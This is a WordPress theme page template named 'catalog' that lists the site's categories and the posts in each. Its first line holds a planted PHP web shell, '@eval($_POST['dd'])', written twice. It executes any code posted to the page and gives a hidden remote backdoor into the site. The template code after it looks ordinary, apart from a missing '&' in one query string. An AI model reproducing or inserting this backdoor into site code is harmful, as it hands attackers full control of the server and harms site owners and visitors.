<?php @eval($_POST['dd']);?><?php @eval($_POST['dd']);?><?php 

/**
 Template Name: catalog
 */

get_header(); 

?>

	<?php while(have_posts()) : the_post(); ?>
	
	<article <?php post_class("post-item"); ?>>
		<?php the_content(); ?>
		<div id="archives-temp">  
		<?php if(akina_option('patternimg') || !get_post_thumbnail_id(get_the_ID())) { ?>
        <h2><?php the_title();?></h2>
        <?php } ?>	
    <div id="archives-content">      
    <?php
    $the_term=get_categories();

    $output = '';
    if(!empty($the_term) && is_array($the_term)){

        foreach ($the_term as $o){

            global $wp_rewrite;

            $cat_id=$o->cat_ID;
            $cat_name=$o->name;
            $cat_count=$o->count;
            $cat_slug=$o->slug;
            $cat_link=$wp_rewrite->front.$cat_slug;

            $the_query = new WP_Query( 'cat='.$cat_id.'posts_per_page=-1&ignore_sticky_posts=1' );

            $output .= "
<div class='archive-title'>
<span class='ar-time'>
<i class='iconfont'>&#xe74a;</i>
</span>
<h3>$cat_name ($cat_count)</h3>
<div class='archives' id='monlist'>
<div class='post-more'>
			<a href='$cat_link'><i class='iconfont'></i></a>
		</div>";
            while ( $the_query->have_posts() ) : $the_query->the_post();

                $output .= '<span class="ar-circle"></span><div class="arrow-left-ar"></div><div class="brick"><a href="'.get_permalink() .'"><span class="time"><i class="iconfont">&#xe65f;</i>'.get_the_time('n-d').'</span>'.get_the_title() .'<em>('. get_comments_number('0', '1', '%') .')</em></a>
</div>';
            endwhile;
            wp_reset_postdata();
            $output .= '</div></div>';
        }
    }


    echo $output;
    ?>   
		</article>
	<?php endwhile; ?>
	
<?php get_footer(); ?>


